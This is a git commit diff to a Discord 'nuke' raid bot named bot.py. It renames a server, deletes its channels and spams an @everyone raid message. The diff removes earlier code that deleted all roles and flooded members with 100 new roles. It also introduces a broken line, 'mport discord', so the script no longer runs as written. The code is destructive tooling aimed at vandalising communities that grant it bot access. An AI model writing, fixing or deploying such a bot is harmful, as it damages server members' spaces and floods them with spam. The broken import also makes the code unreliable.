ea9aa5f80fbad3d3b3d7fab634a99379f31cbc0b
Fear.io <96548811+Fear2o@users.noreply.github.com>
2025-01-04 20:29:01 +0300

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,7 +1,6 @@
-# Made it create and delete roles and rename all members
+# Fixed Some Issues
 
-
-import discord
+mport discord
 from discord.ext import commands
 import asyncio
 
@@ -9,14 +8,12 @@ import asyncio
 TOKEN = 'your_token_here'
 GUILD_NAME = 'Fear is everywhere'  # This is the name the server will be renamed to
 CHANNEL_NAME = 'fear has hacked you'  # This is the name for the channels to create
-ROLE_NAME_BASE = 'Fear owns you'  # This is the base name for the new roles to create
-SPAM_MESSAGE = "@everyone **Wake up, Fear.io is here** :joy: https://tenor.com/view/sinister-nuked-nuke-discord-raid-gif-24293736"  # This is the message that will be spammed
+SPAM_MESSAGE = "@everyone **Wake up, Fear.io is here** :joy: https://tenor.com/view/sinister-nuked-nuke-discord-raid-gif-24293736" # This is the message that will be spammed
 
 intents = discord.Intents.default()
 intents.guilds = True
 intents.messages = True
 intents.message_content = True  # Ensure you have this enabled in your bot
-intents.members = True  # Add this line to allow modifying members
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
@@ -34,29 +31,6 @@ async def nuke(ctx):
             await guild.edit(name=GUILD_NAME)
             print(f'Server renamed to: {GUILD_NAME}')
             
-            # Delete all roles
-            for role in guild.roles:
-                if role.name != "@everyone":  # Prevent deleting the @everyone role
-                    await role.delete()
-                    print(f'Deleted role: {role.name}')
-            
-            # Create 100 new roles with unique names
-            new_roles = []
-            for i in range(1, 101):
-                role_name = f'{ROLE_NAME_BASE} {i}'
-                new_role = await guild.create_role(name=role_name)
-                new_roles.append(new_role)
-                print(f'Created new role: {role_name}')
-            
-            # Assign all 100 new roles to every member
-            for member in guild.members:
-                try:
-                    # Assign each of the 100 roles to the member
-                    await member.add_roles(*new_roles)
-                    print(f'Assigned 100 roles to {member.name}')
-                except Exception as e:
-                    print(f'Could not assign roles to {member.name}: {e}')
-
             # Delete existing channels, including channels in categories
             for channel in guild.channels:
                 if isinstance(channel, discord.TextChannel):
